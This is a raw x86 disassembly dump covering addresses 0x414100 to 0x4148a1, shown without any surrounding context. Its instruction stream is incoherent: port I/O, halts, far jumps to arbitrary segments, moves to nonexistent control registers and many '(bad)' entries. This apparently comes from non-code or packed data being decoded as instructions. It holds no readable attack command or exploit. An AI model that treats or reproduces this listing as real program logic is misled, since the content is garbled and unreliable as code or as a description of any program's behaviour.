  414100:	test   DWORD PTR [ebx],ecx
  414102:	outs   dx,BYTE PTR ds:[esi]
  414103:	in     eax,0xb6
  414105:	sbb    BYTE PTR [edi],bl
  414107:	popa   
  414108:	js     0x414167
  41410a:	sub    DWORD PTR [ecx],edi
  41410c:	fisttp WORD PTR [ebp-0x61f9181d]
  414112:	loopne 0x4140a8
  414114:	cmc    
  414115:	(bad)  
  414116:	loope  0x41413f
  414118:	shr    dh,0x3b
  41411b:	cmp    al,0x47
  41411d:	cmp    BYTE PTR [ebp+0x3125a6d6],al
  414123:	mov    esp,0x1b6e1284
  414128:	les    edx,FWORD PTR [ebp-0x70f32dec]
  41412e:	sbb    al,0x18
  414130:	xor    ebx,DWORD PTR [ecx-0x69]
  414133:	xchg   ebp,esi
  414135:	pop    edi
  414136:	dec    ebx
  414137:	sbb    ah,BYTE PTR [ebx]
  414139:	pop    ebp
  41413a:	add    ebx,DWORD PTR [ecx+0x3f]
  41413d:	mov    ecx,cr7
  414140:	std    
  414141:	xchg   BYTE PTR [ebx-0x43],dl
  414144:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414145:	xor    eax,0x67d3c30
  41414a:	mov    dl,0x8c
  41414c:	adc    eax,0x4e813ead
  414151:	std    
  414152:	pop    esp
  414153:	jo     0x41414a
  414155:	packuswb mm7,QWORD PTR [esi]
  414158:	and    al,0xe4
  41415a:	mov    DWORD PTR [edx+0x2a866063],edx
  414160:	pop    ebp
  414161:	and    bl,BYTE PTR [edi]
  414163:	inc    ecx
  414164:	xchg   ebp,eax
  414165:	pop    esp
  414166:	jg     0x414173
  414168:	mov    bl,0x8f
  41416a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41416b:	mov    dl,0xa8
  41416d:	mov    ebx,0xfd2a026b
  414172:	cs mov dl,0xdc
  414175:	cmp    esi,eax
  414177:	adc    al,0x79
  414179:	add    al,0xff
  41417b:	pop    esi
  41417c:	xor    dl,0x69
  41417f:	sub    eax,0xc579b2fd
  414184:	retf   0xca5b
  414187:	test   al,0x4
  414189:	loop   0x4141b4
  41418b:	xchg   ecx,eax
  41418c:	jne    0x4141d7
  41418e:	imul   ebx,DWORD PTR [edi+0xd2f50a6],0x76c16f5
  414198:	mov    ecx,0xf8a65080
  41419d:	cmp    ecx,eax
  41419f:	jl     0x41416e
  4141a1:	int3   
  4141a2:	xor    BYTE PTR [ebx+0x2a],ah
  4141a5:	dec    edx
  4141a6:	fist   DWORD PTR [esp+esi*1-0x25]
  4141aa:	sbb    DWORD PTR [ecx-0x5182a8d3],edi
  4141b0:	scas   al,BYTE PTR es:[edi]
  4141b1:	js     0x41414a
  4141b3:	sbb    edx,DWORD PTR [esi-0x560bf4d4]
  4141b9:	cwde   
  4141ba:	out    dx,al
  4141bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4141bc:	ins    BYTE PTR es:[edi],dx
  4141bd:	xchg   ebx,eax
  4141be:	repnz fs cmc 
  4141c1:	mov    ebx,0x31c57077
  4141c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4141c7:	rcr    DWORD PTR [edx+0x47d4d308],cl
  4141cd:	sbb    DWORD PTR [esi+0x766ae7f1],ecx
  4141d3:	cwde   
  4141d4:	je     0x4141c7
  4141d6:	push   edx
  4141d7:	shl    ebx,1
  4141d9:	or     BYTE PTR [edx+0x1ed15834],ah
  4141df:	aad    0xc6
  4141e1:	mov    eax,0xfdc57dda
  4141e6:	push   eax
  4141e7:	cmp    DWORD PTR ds:0xfe1836a3,esi
  4141ed:	or     al,0x49
  4141ef:	in     al,0xf5
  4141f1:	shr    BYTE PTR [ebp-0x694c8551],0x2e
  4141f8:	sar    BYTE PTR [ebx],0x86
  4141fb:	in     eax,0x16
  4141fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4141fe:	out    0x5b,eax
  414200:	loop   0x414266
  414202:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414203:	jmp    0xf642fdb5
  414208:	jns    0x414207
  41420a:	daa    
  41420b:	aaa    
  41420c:	xor    al,0x3a
  41420e:	mov    esp,DWORD PTR [edi]
  414210:	push   ds
  414211:	movups xmm7,XMMWORD PTR [esi-0x29]
  414215:	jnp    0x414286
  414217:	mov    al,ds:0xcb054dc9
  41421c:	cmc    
  41421d:	test   DWORD PTR [ecx+ebp*1],esp
  414220:	adc    DWORD PTR ds:0x1c461467,esp
  414226:	in     eax,0x6f
  414228:	es add al,0xd0
  41422b:	mov    esi,0x4549aea3
  414230:	aad    0xf1
  414232:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414233:	mov    cl,0xf5
  414235:	leave  
  414236:	dec    esi
  414237:	jmp    0xb0d3723
  41423c:	sar    BYTE PTR [ebx],0xf6
  41423f:	(bad)  
  414240:	or     cl,BYTE PTR [ecx+0x17de0704]
  414246:	outs   dx,BYTE PTR ds:[esi]
  414247:	push   edx
  414248:	sbb    bl,BYTE PTR [ecx+0x32]
  41424b:	aas    
  41424c:	push   eax
  41424d:	and    eax,0xbd8407ab
  414252:	out    dx,al
  414253:	sbb    ch,al
  414255:	arpl   WORD PTR [eax+0x7dc2e3dc],bp
  41425b:	aam    0xb
  41425d:	mov    dh,BYTE PTR [eax]
  41425f:	cdq    
  414260:	fisubr WORD PTR [ecx+0x383d3c17]
  414266:	xor    edi,DWORD PTR [esi-0x60]
  414269:	cmp    cl,BYTE PTR [edx-0x62]
  41426c:	dec    ebp
  41426d:	sub    ah,cl
  41426f:	stc    
  414270:	int    0x8d
  414272:	mov    cl,0x5
  414274:	test   DWORD PTR [edi+ebx*1+0x5babf439],eax
  41427b:	hlt    
  41427c:	pusha  
  41427d:	in     eax,0x40
  41427f:	fprem1 
  414281:	jecxz  0x414231
  414283:	mov    ds:0x87b7a0e4,eax
  414288:	inc    ecx
  414289:	cmp    BYTE PTR [esi],bl
  41428b:	jg     0x4142ea
  41428d:	bnd ret 0xa2d6
  414291:	outs   dx,DWORD PTR gs:[esi]
  414293:	jns    0x414265
  414295:	pop    es
  414296:	pop    eax
  414297:	sub    eax,0x2510bc8a
  41429c:	xor    DWORD PTR [edx],edi
  41429e:	jecxz  0x414258
  4142a0:	push   esi
  4142a1:	adc    ebp,DWORD PTR [eax]
  4142a3:	leave  
  4142a4:	bound  esi,QWORD PTR [ebx]
  4142a6:	outs   dx,DWORD PTR ds:[esi]
  4142a7:	mov    ah,0x17
  4142aa:	pop    ss
  4142ab:	xchg   esp,eax
  4142ac:	jae    0x41428c
  4142ae:	push   ebp
  4142af:	mov    DWORD PTR [eax],eax
  4142b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4142b2:	scas   eax,DWORD PTR es:[edi]
  4142b3:	cmp    BYTE PTR [ebp-0x75],dl
  4142b6:	mov    ebp,0x1e6b7c6e
  4142bb:	xchg   esi,eax
  4142bc:	in     al,dx
  4142bd:	call   0x4d4caa8c
  4142c2:	fild   WORD PTR [eax+0x2]
  4142c5:	dec    esi
  4142c6:	(bad)  
  4142c7:	push   eax
  4142c8:	mov    bl,0x3b
  4142ca:	mov    dl,0x7f
  4142cc:	dec    ebx
  4142cd:	cli    
  4142ce:	les    esp,FWORD PTR [edx+ebp*4-0x62]
  4142d2:	outs   dx,BYTE PTR ds:[esi]
  4142d3:	fild   WORD PTR [eax+0xe]
  4142d6:	mov    eax,0xa18ea5ea
  4142db:	and    cl,ah
  4142dd:	idiv   esi
  4142df:	cmp    BYTE PTR [ebp+esi*8+0x40],ch
  4142e3:	dec    edx
  4142e4:	inc    ebx
  4142e5:	popf   
  4142e6:	outs   dx,DWORD PTR ds:[esi]
  4142e7:	outs   dx,BYTE PTR ds:[esi]
  4142e8:	adc    al,0x6d
  4142ea:	push   eax
  4142eb:	add    eax,0xbc620517
  4142f0:	mov    bh,0x3b
  4142f2:	daa    
  4142f3:	lahf   
  4142f4:	sbb    DWORD PTR [ebp+0x1b],ecx
  4142f7:	cmp    eax,0x99edf42e
  4142fc:	cmc    
  4142fd:	out    dx,al
  4142fe:	mov    ch,0x9c
  414300:	and    dl,BYTE PTR [ebx-0x59]
  414303:	sti    
  414304:	je     0x41433e
  414306:	sar    DWORD PTR [eax+0x70f99dbb],cl
  41430c:	sbb    eax,0xb9e16efb
  414311:	xchg   esi,eax
  414312:	iret   
  414313:	inc    ecx
  414314:	cmp    eax,esp
  414316:	push   ecx
  414317:	cmp    edi,edx
  414319:	daa    
  41431a:	jns    0x414391
  41431c:	pop    ds
  41431d:	adc    ebx,ebx
  41431f:	and    al,0xf5
  414321:	push   0x8dece127
  414326:	mov    ebx,0xe71e5614
  41432b:	fimul  WORD PTR [ecx+0x38]
  41432e:	pop    edx
  41432f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414330:	cmp    eax,0xf5b076f6
  414335:	sbb    eax,0xbf34081f
  41433a:	test   al,0xce
  41433c:	xchg   esi,eax
  41433d:	or     DWORD PTR [edi-0x14],esp
  414340:	push   es
  414341:	jle    0x4143b2
  414343:	mov    dl,0x6c
  414345:	fmul   DWORD PTR [eax-0x21ae0a9e]
  41434b:	les    esp,FWORD PTR [edi]
  41434d:	inc    ecx
  41434e:	pop    edx
  41434f:	sbb    al,0xcf
  414351:	cmp    ecx,DWORD PTR [edi]
  414353:	jno    0x4143c7
  414355:	pop    ss
  414356:	sar    eax,cl
  414358:	mov    esp,tr4
  41435b:	mov    bl,0xf5
  41435d:	sub    edx,DWORD PTR [edx-0x4dc74eb8]
  414363:	push   es
  414364:	cmp    edi,DWORD PTR [eax]
  414366:	jmp    0x178700be
  41436b:	jns    0x4142fd
  41436d:	out    0x6e,al
  41436f:	rol    DWORD PTR [edi],1
  414371:	aaa    
  414372:	mov    eax,ds:0x87cd0304
  414377:	cmp    BYTE PTR [eax-0x15e4a2a6],ah
  41437d:	es xchg edi,eax
  41437f:	mov    cl,0xf5
  414381:	or     DWORD PTR [ebx-0x2],edi
  414384:	int3   
  414385:	mov    ebp,eax
  414387:	(bad)  
  414388:	pop    esi
  414389:	cmp    BYTE PTR ds:0x8031cb52,al
  41438f:	xor    BYTE PTR ds:0x45ab6ecf,dl
  414395:	jle    0x414362
  414397:	fimul  WORD PTR [esi]
  414399:	retf   0xb62
  41439c:	inc    ecx
  41439d:	leave  
  41439e:	sbb    BYTE PTR [ecx],bh
  4143a0:	pushf  
  4143a1:	repz addr16 jo 0x414388
  4143a5:	jg     0x414416
  4143a7:	clc    
  4143a8:	cmp    eax,0x1babf65c
  4143ad:	jae    0x4143a2
  4143af:	sbb    esp,DWORD PTR [edx]
  4143b1:	retf   
  4143b2:	ins    BYTE PTR es:[edi],dx
  4143b3:	mov    ecx,0x202c9709
  4143b8:	je     0x414342
  4143ba:	outs   dx,BYTE PTR ds:[esi]
  4143bb:	mov    ecx,0xac3519
  4143c0:	pop    edi
  4143c1:	out    0x68,eax
  4143c3:	int    0x57
  4143c5:	ss xchg edi,eax
  4143c7:	inc    ecx
  4143c8:	cli    
  4143c9:	jp     0x414413
  4143cb:	repnz inc eax
  4143cd:	and    BYTE PTR [esi],ah
  4143cf:	gs cmp edx,0x68
  4143d3:	sbb    eax,0x308c1c16
  4143d8:	dec    eax
  4143d9:	clc    
  4143da:	shr    DWORD PTR [ecx+0x75],1
  4143dd:	cmp    BYTE PTR [ebp+0x64],ch
  4143e0:	jb     0x4143ac
  4143e2:	sub    DWORD PTR [edx+eiz*2-0x20],esi
  4143e6:	outs   dx,BYTE PTR ds:[esi]
  4143e7:	pusha  
  4143e8:	nop
  4143e9:	hlt    
  4143ea:	ss sub BYTE PTR gs:[si+0x358d],dl
  4143f1:	xchg   edx,eax
  4143f2:	(bad)  
  4143f3:	adc    eax,0x94eb2df5
  4143f8:	push   0xffffffad
  4143fa:	jb     0x414387
  4143fc:	jge    0x414436
  4143fe:	retf   0x6671
  414401:	stos   BYTE PTR es:[edi],al
  414402:	jne    0x41445c
  414404:	jo     0x414430
  414406:	jbe    0x414470
  414408:	ret    
  414409:	dec    edi
  41440a:	xchg   esp,eax
  41440b:	mov    BYTE PTR [ebp+0x571fb56d],dl
  414411:	cmp    BYTE PTR [ebp+0x1d],ah
  414414:	daa    
  414415:	daa    
  414416:	fidivr DWORD PTR [ecx+0x73]
  414419:	pusha  
  41441a:	outs   dx,DWORD PTR ds:[esi]
  41441b:	hlt    
  41441c:	aam    0xf6
  41441e:	iret   
  41441f:	jb     0x414425
  414421:	leave  
  414422:	pusha  
  414423:	loope  0x414439
  414425:	pushf  
  414426:	outs   dx,BYTE PTR ds:[esi]
  414427:	xor    al,0xe9
  414429:	dec    esp
  41442a:	stos   DWORD PTR es:[edi],eax
  41442b:	push   ecx
  41442c:	mov    ds:0x9adae189,eax
  414431:	ret    
  414432:	fnstsw WORD PTR [eax]
  414434:	mov    ecx,0x446f175a
  414439:	cmp    eax,0xabf6b051
  41443e:	inc    edx
  41443f:	jle    0x414470
  414441:	sub    eax,0xb8a9cdd3
  414446:	pop    ebp
  414447:	sub    ebp,DWORD PTR [edx+ecx*8+0x3f15d43a]
  41444e:	jae    0x41445e
  414450:	ret    
  414451:	jle    0x4144c8
  414453:	mov    al,0x6f
  414455:	add    eax,0xa811d333
  41445a:	xor    BYTE PTR [ecx],bh
  41445c:	xchg   ecx,eax
  41445d:	jns    0x414405
  41445f:	fcmove st,st(2)
  414461:	shr    DWORD PTR ds:0xec4173f6,cl
  414467:	lahf   
  414468:	cmc    
  414469:	mov    bh,0x2b
  41446b:	push   0xffffffe3
  41446d:	mov    edx,0x6a84a6a
  414472:	cld    
  414473:	les    ebp,FWORD PTR [edx]
  414475:	js     0x414407
  414477:	mov    ?,esi
  414479:	jae    0x41449d
  41447b:	scas   al,BYTE PTR es:[edi]
  41447c:	call   0xd651ff10
  414481:	or     edi,DWORD PTR [eax+ecx*4-0x11]
  414485:	cdq    
  414486:	cmp    edi,DWORD PTR [ecx]
  414488:	loop   0x414507
  41448a:	je     0x4144e2
  41448c:	pushf  
  41448d:	sub    eax,0x5af54883
  414492:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  414494:	lahf   
  414495:	inc    esp
  414496:	and    DWORD PTR [edi-0x80],eax
  414499:	cmp    edx,DWORD PTR [edi]
  41449b:	push   cs
  41449c:	out    0x2,eax
  41449e:	mov    edi,0x6e113e00
  4144a3:	test   DWORD PTR [eax+ebp*4],edi
  4144a6:	rcl    al,cl
  4144a8:	xchg   esp,eax
  4144a9:	iret   
  4144aa:	sbb    DWORD PTR [edx],ebx
  4144ac:	lea    esi,[eax]
  4144ae:	cmp    DWORD PTR ss:[esi],ebx
  4144b1:	sub    dh,BYTE PTR [ebx-0x4f]
  4144b4:	sbb    eax,0xd14f790a
  4144b9:	adc    al,0x68
  4144bb:	div    cl
  4144bd:	fimul  DWORD PTR [edi-0x371b2908]
  4144c3:	xor    al,0x90
  4144c5:	and    DWORD PTR [ebx+0x47],ecx
  4144c8:	dec    ebx
  4144c9:	je     0x41453a
  4144cb:	gs xor al,0x7
  4144ce:	or     BYTE PTR [esp+esi*4],bl
  4144d1:	sbb    esp,DWORD PTR ds:0x17aeee59
  4144d7:	cmp    eax,0x4d14039a
  4144dc:	ret    0x22bb
  4144df:	stos   BYTE PTR es:[edi],al
  4144e0:	ror    BYTE PTR [edi-0x4a9e2f91],1
  4144e6:	jle    0x414552
  4144e8:	jmp    0x6413:0xa86daeab
  4144ef:	pop    ebp
  4144f0:	call   0xf5b019e9
  4144f5:	sbb    ch,bl
  4144f7:	push   ebx
  4144f8:	xor    DWORD PTR [ebp+0x78],esi
  4144fb:	or     eax,DWORD PTR [ebx]
  4144fd:	sar    DWORD PTR [edx+0x2498f5f9],0x62
  414504:	gs jae 0x4144fd
  414507:	leave  
  414508:	cmp    bh,BYTE PTR [eax]
  41450a:	ja     0x41453f
  41450c:	out    0x59,eax
  41450e:	mov    DWORD PTR [ebx],edx
  414510:	mov    eax,DWORD PTR [esi+ecx*8]
  414513:	arpl   WORD PTR ds:0x2e42c2fe,si
  414519:	cmp    al,ch
  41451b:	jge    0x414526
  41451d:	shl    DWORD PTR [eax+0x6e11ef7a],cl
  414523:	or     BYTE PTR [ebx-0x4c],ah
  414526:	cwde   
  414527:	(bad)  
  414528:	push   ecx
  414529:	xor    ebx,esp
  41452b:	aas    
  41452c:	cmp    bh,BYTE PTR [ebx+ecx*2-0x72]
  414530:	or     BYTE PTR [esi+0x3abd1e51],0xa8
  414537:	add    dh,ch
  414539:	das    
  41453a:	cmp    esp,DWORD PTR [edx]
  41453c:	or     DWORD PTR [esi+edi*8],edi
  41453f:	xor    eax,ecx
  414541:	cmp    ecx,ecx
  414543:	shl    BYTE PTR [eax+0x168718b4],cl
  414549:	icebp  
  41454a:	outs   dx,BYTE PTR ds:[esi]
  41454b:	out    0x2b,eax
  41454d:	xlat   BYTE PTR ds:[ebx]
  41454e:	push   cs
  41454f:	or     BYTE PTR [ebp+0x14399697],bh
  414555:	int3   
  414556:	adc    DWORD PTR ds:0xfb87a0f4,esp
  41455c:	adc    bh,BYTE PTR [ebp-0x667115d2]
  414562:	add    edi,esi
  414564:	and    al,0x20
  414566:	int    0x38
  414568:	xor    BYTE PTR [esi],bh
  41456a:	or     BYTE PTR [esi+0x46f014e5],cl
  414570:	cmc    
  414571:	mov    bl,0x3
  414573:	mov    dl,BYTE PTR [ecx+0x50]
  414576:	(bad)  
  414577:	jmp    0x39ae:0x394c5060
  41457e:	mov    al,0xb4
  414580:	call   0xda4c:0xf5a5290c
  414587:	xchg   edx,eax
  414588:	(bad)  
  414589:	mov    esp,DWORD PTR [edx-0x7e]
  41458c:	and    eax,0xb7f4f038
  414591:	inc    esi
  414592:	add    al,bh
  414594:	dec    esp
  414595:	bound  esi,QWORD PTR [eax-0x1e]
  414598:	stos   BYTE PTR es:[edi],al
  414599:	lds    ebp,FWORD PTR [ecx-0x61f49fcd]
  41459f:	fcomp  st(1)
  4145a1:	jl     0x414605
  4145a3:	cmp    DWORD PTR [ecx-0x301364f2],edx
  4145a9:	pop    es
  4145aa:	out    dx,al
  4145ab:	int3   
  4145ac:	rcl    esi,0x6e
  4145af:	mov    dl,0x37
  4145b1:	xor    eax,DWORD PTR ds:0x76770196
  4145b7:	cmp    ah,ah
  4145b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4145ba:	nop
  4145bb:	push   0x527cbfbf
  4145c0:	call   0x5c7d914e
  4145c5:	push   ebx
  4145c6:	push   edx
  4145c7:	jns    0x4145f9
  4145c9:	mov    ch,bl
  4145cb:	mov    ebx,0xe18d0978
  4145d0:	jmp    0x8b1a:0xd5228f87
  4145d7:	push   eax
  4145d8:	fcmovu st,st(4)
  4145da:	outs   dx,BYTE PTR ds:[esi]
  4145db:	pushf  
  4145dc:	push   edi
  4145dd:	ss mov cl,0x2c
  4145e0:	test   DWORD PTR [ebx+0x3be73934],ecx
  4145e6:	add    al,0x26
  4145e8:	sbb    edi,DWORD PTR [ebx+eiz*2]
  4145eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4145ec:	cmc    
  4145ed:	add    DWORD PTR [ecx],0x912c3c70
  4145f3:	xor    BYTE PTR [ebx],bh
  4145f5:	mov    ds:0x211f3923,al
  4145fa:	fnstenv [eax-0x39]
  4145fd:	mov    dh,0xe6
  4145ff:	sbb    eax,0x4a3478f5
  414604:	lds    ecx,FWORD PTR [ebx+0x1e7bed7e]
  41460a:	inc    esi
  41460b:	sub    BYTE PTR [eax+edi*1],dl
  41460e:	cld    
  41460f:	inc    eax
  414610:	iret   
  414611:	jl     0x41460b
  414613:	xor    eax,0x16eaacd
  414618:	mov    dh,0xb0
  41461a:	repz adc BYTE PTR [eax+esi*8+0x3a],0x3c
  414620:	mov    esp,0xaecc01d5
  414625:	push   es
  414626:	push   es
  414627:	adc    eax,0x586ed13a
  41462c:	popf   
  41462d:	jns    0x414692
  41462f:	cld    
  414630:	(bad)  
  414631:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414632:	jbe    0x41466c
  414634:	xchg   esp,eax
  414635:	add    eax,0x7fb64055
  41463a:	stc    
  41463b:	ret    0x7a01
  41463e:	push   eax
  41463f:	mov    ch,dh
  414641:	push   cs
  414642:	sbb    bh,BYTE PTR [ebx]
  414644:	lock dec ah
  414647:	cmp    BYTE PTR ds:0xc04144e1,bl
  41464d:	imul   edx,eax,0xf91e1361
  414653:	xor    ch,0xdd
  414656:	aad    0xfe
  414658:	sti    
  414659:	push   ebx
  41465a:	cdq    
  41465b:	cmp    BYTE PTR [esi],al
  41465d:	data16 clc 
  41465f:	aas    
  414660:	adc    DWORD PTR [edx-0x66],ecx
  414663:	fwait
  414664:	out    0x11,eax
  414666:	fiadd  WORD PTR [edx+0x623194f5]
  41466c:	push   ds
  41466d:	mul    BYTE PTR [edx]
  41466f:	cmp    DWORD PTR [eax+0x2f],edi
  414672:	dec    edx
  414673:	pop    es
  414674:	loop   0x41465f
  414676:	cmp    al,0xf8
  414678:	cmc    
  414679:	adc    DWORD PTR [edx+0x2868a94],ebx
  41467f:	mov    esi,0x9c14f8da
  414684:	jbe    0x4146a2
  414686:	fbstp  TBYTE PTR ds:0x71be973
  41468c:	in     al,dx
  41468d:	sbb    esp,esi
  41468f:	mov    al,0x75
  414691:	and    edx,ebx
  414693:	stc    
  414694:	mov    ch,0x3b
  414696:	test   DWORD PTR [ebp-0x4c],0x60360970
  41469d:	mov    ah,0x6e
  41469f:	push   0x4f07dcd5
  4146a4:	es aas 
  4146a6:	mov    dl,0xfb
  4146a8:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4146aa:	stc    
  4146ab:	adc    BYTE PTR [ebx+edi*1+0x761e684e],al
  4146b2:	jmp    0x1b13793b
  4146b7:	test   al,0x75
  4146b9:	sbb    al,0x53
  4146bb:	cmp    DWORD PTR [ecx+ebx*1+0x3ba26de9],ecx
  4146c2:	pushf  
  4146c3:	mov    ds:0xadbdb1ce,al
  4146c8:	jae    0x41468f
  4146ca:	mov    al,bh
  4146cc:	sti    
  4146cd:	jmp    FWORD PTR [ecx-0x73]
  4146d0:	gs push 0x11
  4146d3:	dec    ecx
  4146d4:	retf   0xc535
  4146d7:	cmp    BYTE PTR [ebx-0x56],bh
  4146da:	sub    al,0x3a
  4146dc:	aad    0x0
  4146de:	mov    edi,0x1a5cf7e0
  4146e3:	xlat   BYTE PTR ds:[ebx]
  4146e4:	pushf  
  4146e5:	cld    
  4146e6:	cmp    eax,0x9489fdd9
  4146eb:	aas    
  4146ec:	mov    bl,0x33
  4146ee:	add    BYTE PTR [edi-0x7a9965a0],ch
  4146f4:	fistp  DWORD PTR [esi+ebp*2+0x120301dd]
  4146fb:	(bad)  
  4146fc:	mov    ebx,0xc136e5cd
  414701:	dec    ebx
  414702:	push   0xffffffac
  414704:	xchg   ebp,eax
  414705:	or     ebx,ebx
  414707:	jge    0x41473e
  414709:	dec    esp
  41470a:	xor    BYTE PTR [edi-0x4a],bl
  41470d:	in     al,dx
  41470e:	pop    edx
  41470f:	mov    ah,0xf6
  414711:	mov    bh,0xc5
  414713:	(bad)  [ebx+0x61]
  414716:	aaa    
  414717:	or     dl,al
  414719:	es inc edi
  41471b:	ret    
  41471c:	out    dx,al
  41471d:	cmp    ah,ch
  41471f:	repz and eax,0x4eacb2e4
  414725:	stc    
  414726:	outs   dx,BYTE PTR ds:[esi]
  414727:	xchg   al,ah
  414729:	and    eax,0x7215b49c
  41472e:	sub    BYTE PTR [ecx],bh
  414730:	pop    ebx
  414731:	sbb    ah,dl
  414733:	add    BYTE PTR [edi+0x16],ah
  414736:	cmp    bl,BYTE PTR [eax]
  414738:	cmc    
  414739:	pop    edx
  41473a:	dec    eax
  41473b:	stc    
  41473c:	xor    ah,BYTE PTR [eax]
  41473e:	fild   DWORD PTR [edi+0x7e]
  414741:	cmp    BYTE PTR [ebx-0x2d0cbb0b],ch
  414747:	outs   dx,BYTE PTR ds:[esi]
  414748:	outs   dx,BYTE PTR ds:[esi]
  414749:	jno    0x4147ba
  41474b:	ins    BYTE PTR es:[edi],dx
  41474c:	add    eax,0x5fcfa2ca
  414751:	xchg   esp,eax
  414752:	test   BYTE PTR [ecx],bh
  414754:	push   cs
  414755:	out    dx,al
  414756:	in     eax,dx
  414757:	fisttp WORD PTR [ecx+0x43]
  41475a:	loop   0x4147d8
  41475c:	dec    esp
  41475d:	mov    cl,0x6e
  41475f:	and    esi,ecx
  414761:	mov    ebp,0x99cad8eb
  414766:	push   ebx
  414767:	cmp    DWORD PTR [ecx],esi
  414769:	jb     0x414746
  41476b:	gs stc 
  41476d:	dec    esi
  41476e:	jmp    0xe4f2:0x6f5df1d3
  414775:	hlt    
  414776:	out    0x2,al
  414778:	push   cs
  414779:	push   esp
  41477a:	ja     0x4147b4
  41477c:	pop    esi
  41477d:	cdq    
  41477e:	adc    BYTE PTR [ecx+eiz*4-0x8],ch
  414782:	int    0x60
  414784:	cmc    
  414785:	and    eax,0xce246646
  41478a:	(bad)  
  41478b:	cmp    eax,DWORD PTR [ecx]
  41478d:	cmp    BYTE PTR [ebx-0x6f],ah
  414790:	in     eax,dx
  414791:	or     ah,BYTE PTR [edi+0x6f54a324]
  414797:	je     0x414760
  414799:	or     ecx,eax
  41479b:	ret    
  41479c:	cmp    al,0xde
  41479e:	xchg   esp,eax
  41479f:	cmp    BYTE PTR [ebx+edx*2],al
  4147a2:	jnp    0x414820
  4147a4:	adc    BYTE PTR [edi+0x2a],cl
  4147a7:	add    eax,0x3e65d7f5
  4147ac:	mov    eax,0xdfa9cbb5
  4147b1:	out    0x18,al
  4147b3:	out    0xb0,eax
  4147b5:	lea    esi,[ebp-0x43]
  4147b8:	sbb    al,0xda
  4147ba:	stc    
  4147bb:	cmp    bh,al
  4147bd:	imul   eax,DWORD PTR ds:0x770af533,0xee9dcbe4
  4147c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4147c8:	mov    bl,0xa4
  4147ca:	cmp    DWORD PTR [bp+si-0x33],ebx
  4147ce:	jge    0x4147ce
  4147d0:	or     edx,DWORD PTR [esi]
  4147d2:	xor    bh,ah
  4147d4:	in     al,dx
  4147d5:	into   
  4147d6:	fs xchg esp,eax
  4147d8:	imul   ebx,DWORD PTR cs:[edi-0x79],0xffffffe2
  4147dd:	or     eax,0x189538d0
  4147e2:	and    BYTE PTR [ebp+0x3e],0xc2
  4147e6:	test   DWORD PTR [esi-0x390be3d3],esi
  4147ec:	imul   BYTE PTR [ebx+eiz*2+0x52]
  4147f0:	xor    ch,BYTE PTR [edi]
  4147f2:	into   
  4147f3:	add    edi,eax
  4147f5:	pop    eax
  4147f6:	aas    
  4147f7:	pushf  
  4147f8:	lods   al,BYTE PTR ds:[esi]
  4147f9:	fstp   DWORD PTR [edi+0x59bf0a39]
  4147ff:	pop    es
  414800:	sub    BYTE PTR [ebx+ecx*2],ah
  414803:	je     0x4147ba
  414805:	scas   eax,DWORD PTR es:[edi]
  414806:	outs   dx,DWORD PTR ds:[esi]
  414807:	push   edx
  414808:	cmc    
  414809:	dec    edx
  41480a:	daa    
  41480b:	bound  ebx,QWORD PTR [esi-0x8]
  41480e:	mov    esi,eax
  414810:	cs pop cx
  414813:	int    0xed
  414815:	cmp    BYTE PTR [ebx+0x4c313049],bh
  41481b:	adc    dl,BYTE PTR [ebx]
  41481d:	push   esi
  41481e:	outs   dx,DWORD PTR ds:[esi]
  41481f:	dec    ebp
  414820:	mul    BYTE PTR [ecx+0x54b43e91]
  414826:	fistp  QWORD PTR [eax]
  414828:	or     eax,0x2ca2c3bf
  41482d:	fmul   DWORD PTR [ecx]
  41482f:	push   edi
  414830:	jae    0x414845
  414832:	outs   dx,BYTE PTR ds:[esi]
  414833:	mov    ah,BYTE PTR [ebx+0x7]
  414836:	lods   al,BYTE PTR ds:[esi]
  414837:	gs aad 0xf6
  41483a:	adc    bl,BYTE PTR [ebx]
  41483c:	test   eax,0x592baa3e
  414841:	int    0x75
  414843:	out    0x56,eax
  414845:	dec    ebx
  414846:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414847:	in     eax,dx
  414848:	jp     0x414832
  41484a:	and    al,0xe
  41484c:	cmc    
  41484d:	sahf   
  41484e:	add    esi,DWORD PTR [ebx]
  414850:	inc    esi
  414851:	lods   eax,DWORD PTR ds:[esi]
  414852:	fdiv   QWORD PTR [edx-0x3e]
  414855:	push   ebp
  414856:	jae    0x414862
  414858:	div    dh
  41485a:	cmp    al,0x39
  41485c:	fisub  WORD PTR [ebp+0x3d6558aa]
  414862:	outs   dx,BYTE PTR ds:[esi]
  414863:	call   0x2332:0x8907c51
  41486a:	mov    ch,0xa8
  41486c:	in     al,dx
  41486d:	out    0x59,al
  41486f:	jecxz  0x4148dd
  414871:	adc    al,BYTE PTR [ecx+0x5d]
  414874:	mov    cl,0x1e
  414876:	jbe    0x4148f0
  414878:	loope  0x4148df
  41487a:	repnz loope 0x414872
  41487d:	lods   eax,DWORD PTR ds:[esi]
  41487e:	or     dl,BYTE PTR [eax+0x528f49eb]
  414884:	dec    edx
  414885:	cmp    BYTE PTR ds:0xe2762d7a,dh
  41488b:	daa    
  41488c:	cld    
  41488d:	xchg   ecx,eax
  41488e:	outs   dx,BYTE PTR ds:[esi]
  41488f:	mov    DWORD PTR [ebx-0x5fef3e32],ebp
  414895:	jnp    0x4148c1
  414897:	cmp    DWORD PTR [edi],esp
  414899:	int3   
  41489a:	push   ss
  41489b:	aam    0xc1
  41489d:	sahf   
  41489e:	push   cs
  41489f:	inc    ebx
  4148a0:	cmc    
  4148a1:	shl    DWORD PTR [edi+0x790a350a],0x6
